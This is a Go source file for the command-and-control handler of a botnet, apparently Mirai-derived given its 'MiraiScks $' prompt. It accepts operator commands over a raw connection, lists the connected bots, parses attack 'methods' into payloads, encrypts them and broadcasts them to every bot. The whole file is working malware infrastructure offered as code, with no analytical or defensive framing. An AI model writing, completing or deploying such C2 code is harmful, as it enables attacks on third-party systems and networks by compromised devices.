package cnc

import (
	"bytes"
	"fmt"
	"net"
	"strings"
)

func (h *Handler) RunConnHandler(conn net.Conn) {
	defer conn.Close()

	var b = make([]byte, 1024)

	for {
		conn.Write([]byte("MiraiScks $ "))

		n, err := conn.Read(b)
		if err != nil {
			if err.Error() == "EOF" {
				return
			}

		}

		cmd := string(b[:n])

		// ctrl + c
		if bytes.EqualFold([]byte(cmd), []byte{255, 244, 255, 253, 6}) {
			return
		}

		// payload := h.services.Encrypter.Encrypt(cmd, h.services.Encrypter.RandKey())

		// TODO: refactor
		if strings.Contains(cmd, "bots") {
			var final string

			final += fmt.Sprintf("Total: %d\n", h.services.BotCache.Len())

			final += h.services.Cmds.GetBots()
			conn.Write([]byte(final))
			continue
		}

		payloadString, isMethod, err := h.services.Parser.Parse(cmd)
		if err != nil {
			conn.Write([]byte(err.Error() + "\n"))
			continue
		}

		if isMethod {
			fmt.Println(payloadString)
			payload := h.services.Encrypter.Encrypt(payloadString, h.services.Encrypter.RandKey())

			h.services.Broadcaster.Broadcast(payload)

			conn.Write([]byte("sent\n"))
		}

		// h.services.Parser.Parse()
	}
}
